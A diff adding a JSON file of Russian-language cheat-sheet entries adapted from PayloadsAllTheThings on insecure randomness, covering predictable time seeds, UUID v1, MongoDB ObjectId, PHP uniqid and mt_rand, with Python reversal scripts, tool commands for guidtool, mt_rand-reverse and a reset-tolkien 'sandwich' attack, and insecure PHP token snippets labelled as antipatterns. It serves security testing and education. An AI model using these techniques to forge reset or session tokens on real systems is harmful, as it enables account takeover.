@@ -1,0 +1,149 @@
+{
+  "category": "Insecure Randomness",
+  "source": "PayloadsAllTheThings/Insecure Randomness/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое insecure randomness",
+      "language": "text",
+      "tags": ["methodology", "prng"],
+      "body": "Небезопасная случайность возникает, когда источник энтропии или способ генерации случайных значений недостаточно непредсказуем. Это приводит к предсказуемым выходным значениям, которые может вычислить атакующий — и тем самым обойти контроль доступа, угнать сессию или подделать токен.\n\nЧастые слабые методы: seed на основе времени, GUID/UUID, MongoDB ObjectId, функция uniqid(), а также самописные алгоритмы поверх rand()/mt_rand()."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Где искать предсказуемую случайность",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "• Токены сброса пароля (password reset) — самая частая цель.\n• Идентификаторы сессий, CSRF-токены, OTP/2FA-коды.\n• Инвайт-ссылки, токены подтверждения email, API-ключи.\n• Любые \"уникальные\" ID объектов (заказы, файлы, документы) — IDOR через предсказание.\n• Признаки слабого ГПСЧ: токен короткий, выглядит как hex от timestamp, монотонно растёт между двумя запросами, меняется во времени, а не случайно.\n• Снимай по два-три значения подряд с минимальным интервалом — так проще восстановить seed/состояние."
+    },
+    {
+      "subcategory": "Time-Based Seeds",
+      "title": "Seed по текущему времени (predictable)",
+      "language": "python",
+      "tags": ["python", "seed", "time-based"],
+      "body": "import random\nimport time\n\nseed = int(time.time())\nrandom.seed(seed)\nprint(random.randint(1, 100))",
+      "meta": {
+        "tip": "ГПСЧ засеян текущим временем, поэтому результат предсказуем для любого, кто знает или может оценить значение seed."
+      }
+    },
+    {
+      "subcategory": "Time-Based Seeds",
+      "title": "Восстановление значения по известному времени",
+      "language": "python",
+      "tags": ["python", "seed", "exploitation"],
+      "body": "import random\nimport time\n\n# Seed based on the provided timestamp\nseed = int(time.mktime(time.strptime('2024-11-10 13:37', '%Y-%m-%d %H:%M')))\nrandom.seed(seed)\n\n# Generate the random number\nprint(random.randint(1, 100))",
+      "meta": {
+        "tip": "Зная точное время генерации (например 2024-11-10 13:37), атакующий пересоздаёт тот же seed и регенерирует корректное случайное значение."
+      }
+    },
+    {
+      "subcategory": "GUID / UUID",
+      "title": "Что такое GUID/UUID",
+      "language": "text",
+      "tags": ["guid", "uuid", "methodology"],
+      "body": "GUID (Globally Unique Identifier) / UUID — это 128-битное число для уникальной идентификации, обычно записывается как hex-группы через дефис, например 550e8400-e29b-41d4-a716-446655440000.\n\nИдентификация версии: xxxxxxxx-xxxx-Mxxx-Nxxx-xxxxxxxxxxxx — 4-битное поле M и 1-3-битное поле N кодируют формат самого UUID. Версия 1 (на основе времени и MAC) предсказуема и атакуема."
+    },
+    {
+      "subcategory": "GUID / UUID",
+      "title": "Версии GUID/UUID",
+      "language": "table",
+      "tags": ["guid", "uuid", "versions"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Версия", "Описание"],
+          "rows": [
+            ["0", "Только 00000000-0000-0000-0000-000000000000"],
+            ["1", "на основе времени или clock sequence"],
+            ["2", "зарезервирована в RFC 4122, но опущена во многих реализациях"],
+            ["3", "на основе MD5-хеша"],
+            ["4", "сгенерирована случайно"],
+            ["5", "на основе SHA1-хеша"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "GUID / UUID",
+      "title": "guidtool — анализ и атака на UUID v1",
+      "language": "text",
+      "tags": ["guid", "uuid", "tools"],
+      "body": "# https://github.com/intruder-io/guidtool — инспекция и атака на GUID версии 1\n\n$ guidtool -i 95f6e264-bb00-11ec-8833-00155d01ef00\nUUID version: 1\nUUID time: 2022-04-13 08:06:13.202186\nUUID timestamp: 138691299732021860\nUUID node: 91754721024\nUUID MAC address: 00:15:5d:01:ef:00\nUUID clock sequence: 2099\n\n$ guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000",
+      "meta": {
+        "tip": "Из UUID v1 вытаскивается время генерации и MAC-адрес. Зная примерное время выпуска токена, флагом -t задаёшь точку отсчёта, -p — число кандидатов для перебора соседних значений."
+      }
+    },
+    {
+      "subcategory": "Mongo ObjectId",
+      "title": "Структура Mongo ObjectId (предсказуемость)",
+      "language": "text",
+      "tags": ["mongodb", "objectid", "methodology"],
+      "body": "12-байтный ObjectId генерируется предсказуемо и состоит из:\n\n• Timestamp (4 байта): время создания в секундах от Unix epoch (1 января 1970).\n• Machine Identifier (3 байта): идентификатор машины (из hostname/IP) — предсказуем для документов с одной машины.\n• Process ID (2 байта): идентификатор процесса MongoDB — предсказуем для документов одного процесса.\n• Counter (3 байта): счётчик, инкрементируется на каждый новый ObjectId. Инициализируется случайно при старте процесса, но дальше значения идут последовательно и предсказуемо.\n\nПримеры токенов: 5ae9b90a2c144b9def01ec37, 5ae9bac82c144b9def01ec39"
+    },
+    {
+      "subcategory": "Mongo ObjectId",
+      "title": "mongo-objectid-predict — предсказание следующих ID",
+      "language": "text",
+      "tags": ["mongodb", "objectid", "tools"],
+      "body": "# https://github.com/andresriancho/mongo-objectid-predict — предсказание Mongo ObjectId\n\n./mongo-objectid-predict 5ae9b90a2c144b9def01ec37\n5ae9bac82c144b9def01ec39\n5ae9bacf2c144b9def01ec3a\n5ae9bada2c144b9def01ec3b",
+      "meta": {
+        "tip": "Имея один валидный ObjectId, инструмент предсказывает следующие — путь к IDOR, когда ссылки на объекты строятся на ObjectId."
+      }
+    },
+    {
+      "subcategory": "Mongo ObjectId",
+      "title": "Разбор ObjectId на timestamp/process/counter",
+      "language": "python",
+      "tags": ["mongodb", "objectid", "python"],
+      "body": "def MongoDB_ObjectID(timestamp, process, counter):\n    return \"%08x%10x%06x\" % (\n        timestamp,\n        process,\n        counter,\n    )\n\ndef reverse_MongoDB_ObjectID(token):\n    timestamp = int(token[0:8], 16)\n    process = int(token[8:18], 16)\n    counter = int(token[18:24], 16)\n    return timestamp, process, counter\n\n\ndef check(token):\n    (timestamp, process, counter) = reverse_MongoDB_ObjectID(token)\n    return token == MongoDB_ObjectID(timestamp, process, counter)\n\ntokens = [\"5ae9b90a2c144b9def01ec37\", \"5ae9bac82c144b9def01ec39\"]\nfor token in tokens:\n    (timestamp, process, counter) = reverse_MongoDB_ObjectID(token)\n    print(f\"{token}: {timestamp} - {process} - {counter}\")"
+    },
+    {
+      "subcategory": "Uniqid",
+      "title": "uniqid основан на timestamp (обратим)",
+      "language": "text",
+      "tags": ["uniqid", "php", "methodology"],
+      "body": "Токены, полученные через uniqid, основаны на timestamp и поэтому обратимы.\n\nРеализации для изучения:\n• https://github.com/Riamse/python-uniqid/blob/master/uniqid.py — на основе timestamp\n• https://github.com/php/php-src/blob/master/ext/standard/uniqid.c\n\nПримеры токенов:\n• uniqid: 6659cea087cd6, 6659cea087cea\n• sha256(uniqid): 4b26d474c77daf9a94d82039f4c9b8e555ad505249437c0987f12c1b80de0bf4, ae72a4c4cdf77f39d1b0133394c0cb24c33c61c4505a9fe33ab89315d3f5a1e4"
+    },
+    {
+      "subcategory": "Uniqid",
+      "title": "Реверс uniqid → timestamp",
+      "language": "python",
+      "tags": ["uniqid", "python", "exploitation"],
+      "body": "import math\nimport datetime\n\ndef uniqid(timestamp: float) -> str:\n    sec = math.floor(timestamp)\n    usec = round(1000000 * (timestamp - sec))\n    return \"%8x%05x\" % (sec, usec)\n\ndef reverse_uniqid(value: str) -> float:\n    sec = int(value[:8], 16)\n    usec = int(value[8:], 16)\n    return float(f\"{sec}.{usec}\")\n\ntokens = [\"6659cea087cd6\" , \"6659cea087cea\"]\nfor token in tokens:\n    t = float(reverse_uniqid(token))\n    d = datetime.datetime.fromtimestamp(t)\n    print(f\"{token} - {t} => {d}\")",
+      "meta": {
+        "tip": "Если токен сброса/инвайта выглядит как 13-символьный hex — это, вероятно, uniqid(). Реверс даёт точное время генерации, после чего можно перебрать соседние значения времени."
+      }
+    },
+    {
+      "subcategory": "mt_rand",
+      "title": "Восстановление seed mt_rand() по двум выводам",
+      "language": "text",
+      "tags": ["mt_rand", "php", "tools"],
+      "body": "# Breaking mt_rand() with two output values and no bruteforce.\n# https://github.com/ambionics/mt_rand-reverse\n\n./display_mt_rand.php 12345678 123\n712530069 674417379\n\n./reverse_mt_rand.py 712530069 674417379 123 1",
+      "meta": {
+        "tip": "Скрипт восстанавливает seed mt_rand() всего по двум выводам и без брутфорса. Аргументы reverse_mt_rand.py — два полученных значения, нижняя/верхняя границы диапазона."
+      }
+    },
+    {
+      "subcategory": "Custom Algorithms",
+      "title": "Самописные алгоритмы случайности (антипаттерны)",
+      "language": "php",
+      "tags": ["php", "custom", "antipattern"],
+      "body": "$token = md5($emailId).rand(10,9999);\n$token = md5(time()+123456789 % rand(4000, 55000000));",
+      "meta": {
+        "tip": "Писать свой генератор случайности не рекомендуется. Это реальные примеры из GitHub/StackOverflow, встречающиеся в проде: md5 от известного email + слабый rand(), либо целиком завязка на time() — всё это предсказуемо."
+      }
+    },
+    {
+      "subcategory": "Custom Algorithms",
+      "title": "reset-tolkien — детект и sandwich-атака",
+      "language": "text",
+      "tags": ["tools", "time-based", "sandwich"],
+      "body": "# Generic identification and sandwich attack\n# https://github.com/AethliosIK/reset-tolkien\n\nreset-tolkien detect 660430516ffcf -d \"Wed, 27 Mar 2024 14:42:25 GMT\" --prefixes \"attacker@example.com\" --suffixes \"attacker@example.com\" --timezone \"-7\"\nreset-tolkien sandwich 660430516ffcf -bt 1711550546.485597 -et 1711550546.505134 -o output.txt --token-format=\"uniqid\"",
+      "meta": {
+        "tip": "Sandwich-атака: запускаешь генерацию токена жертвы между двумя своими запросами с известным временем (-bt начало, -et конец), затем перебираешь все значения времени в этом узком окне. reset-tolkien автоматизирует детект формата и сам перебор."
+      }
+    }
+  ]
+}
